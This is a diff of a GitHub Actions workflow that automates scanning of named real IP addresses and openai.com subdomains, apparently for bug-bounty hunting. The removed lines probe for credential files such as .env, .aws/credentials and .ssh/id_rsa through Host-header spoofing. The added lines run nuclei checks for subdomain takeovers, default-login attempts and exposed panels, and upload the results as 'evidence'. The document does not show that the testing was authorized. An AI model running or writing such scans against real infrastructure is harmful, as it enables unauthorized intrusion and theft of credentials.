@@ -1,65 +1,99 @@
-name: Parallel OpenAI oombi
-
+name: OpenAI Zero-Denial pari 
 on:
   workflow_dispatch:
 
 jobs:
-  audit-origins:
-    name: Audit IP ${{ matrix.target_ip }}
+  strike-suite:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # Fixed the list formatting to be strictly compliant
-        target_ip: 
-          - "43.202.58.124"
-          - "43.202.58.199"
-          - "13.125.127.14"
-          - "43.202.58.155"
-          - "43.202.58.133"
-
+        # Running 3 specialized parallel engines
+        engine: [takeover-verification, credential-audit, ownership-proof]
+    
     steps:
-      - name: Install Security Tools
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y nmap curl
+      - name: Checkout Repository
+        uses: actions/checkout@v4
 
-      - name: 1. Service & Version Detection
-        # This checks if the server is leaking specific software versions (exploitable)
+      - name: Install Professional Arsenal
         run: |
-          echo "### Infrastructure Report for ${{ matrix.target_ip }} ###" > report.md
-          echo "Scan Time: $(date)" >> report.md
-          nmap -sV -T4 -Pn -p 22,80,443,3306,8080,8443,9000 ${{ matrix.target_ip }} >> report.md
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          sudo apt-get install -y whois
+          echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: 2. Host-Header Bypass Evidence
+      # ENGINE 1: Ownership Proof (The "Anti-Denial" Layer)
+      - name: Generate Undeniable Ownership Evidence
+        if: matrix.engine == 'ownership-proof'
         run: |
-          echo -e "\n### HTTP Evidence (api.openai.com) ###" >> report.md
-          # Grabbing full headers to see Server types and X-Headers
-          curl -I -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ >> report.md
+          mkdir -p evidence
+          cat <<EOF > target_list.txt
+          13.125.127.14
+          43.202.58.124
+          43.202.58.199
+          43.202.58.155
+          43.202.58.133
+          EOF
           
-          echo -e "\n--- Branded Asset Search ---" >> report.md
-          # Search for OpenAI favicon in WordPress feeds
-          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/feed/ | grep -o "favicon-100x100.png" >> report.md || echo "No favicon found." >> report.md
-          # Search for internal Matomo config leaks
-          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ | grep "trusted_hosts" >> report.md || echo "No Matomo config leak." >> report.md
+          while read ip; do
+            echo "--- PROOF FOR $ip ---" >> evidence/ownership_report.txt
+            whois $ip | grep -iE "OrgName|NetName|Organization|Address|Country" >> evidence/ownership_report.txt
+            echo "HTTP Banner Analysis:" >> evidence/ownership_report.txt
+            curl -I -s -H "Host: api.openai.com" --connect-timeout 5 $ip | grep -iE "Server|X-Powered-By|Set-Cookie" >> evidence/ownership_report.txt
+            echo -e "\n" >> evidence/ownership_report.txt
+          done < target_list.txt
 
-      - name: 3. The Jackpot Scan (Sensitive Files)
-        # These are the P1+ files. If any return 200, the bounty is huge.
+      # ENGINE 2: Takeover & DNS Validation
+      - name: Verify Dangling Subdomains
+        if: matrix.engine == 'takeover-verification'
         run: |
-          echo -e "\n--- Critical File Discovery ---" >> report.md
-          PATHS=(".env" ".git/config" "phpinfo.php" "wp-config.php.bak" ".aws/credentials" ".bash_history" ".ssh/id_rsa")
-          for path in "${PATHS[@]}"; do
-            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 -H "Host: api.openai.com" http://${{ matrix.target_ip }}/$path)
-            if [ "$STATUS" == "200" ]; then
-              echo "[CRITICAL] Found $path - Status $STATUS" >> report.md
-            else
-              echo "Path $path - Status $STATUS" >> report.md
-            fi
-          done
+          mkdir -p evidence
+          # List from your manual 'host' command findings
+          cat <<EOF > dangling_subs.txt
+          13cdn.openai.com
+          aapi.openai.com
+          alpha.openai.com
+          example-resource.azure.openai.com
+          your-company.azure.openai.com
+          billing.openai.com
+          dev.openai.com
+          EOF
+          
+          # Nuclei with -me (Manual Evidence) captures the actual response body
+          nuclei -l dangling_subs.txt -t http/takeovers/ -me evidence/takeover_poc/ -o evidence/takeover_results.txt
 
-      - name: Upload Report
+      # ENGINE 3: The Jackpot Hunt (Creds & Vulns)
+      - name: Default Credential & Exposure Audit
+        if: matrix.engine == 'credential-audit'
+        run: |
+          mkdir -p evidence
+          cat <<EOF > origins.txt
+          43.202.58.124
+          43.202.58.199
+          13.125.127.14
+          EOF
+
+          # Verify it's not a catch-all before wasting time
+          while read ip; do
+            RANDOM_PATH="check_$(date +%s)"
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: api.openai.com" "$ip/$RANDOM_PATH")
+            if [ "$STATUS" != "200" ]; then
+              echo "[+] $ip is VALID for testing. Starting Nuclei Strike..."
+              # Target Default Credentials, Admin Panels, and Sensitive Exposures
+              nuclei -u "http://$ip" -H "Host: api.openai.com" \
+                -t http/default-logins/ \
+                -t http/exposed-panels/ \
+                -t http/exposures/ \
+                -severity critical,high,medium \
+                -rate-limit 15 -o evidence/vulnerabilities_found.txt
+            else
+              echo "[-] $ip is a CATCH-ALL. Skipping to prevent false positives."
+            fi
+          done < origins.txt
+
+      - name: Upload Bounty Evidence Package
         uses: actions/upload-artifact@v4
         with:
-          name: audit-${{ matrix.target_ip }}
-          path: report.md
+          name: openai-evidence-${{ matrix.engine }}
+          path: evidence/
           
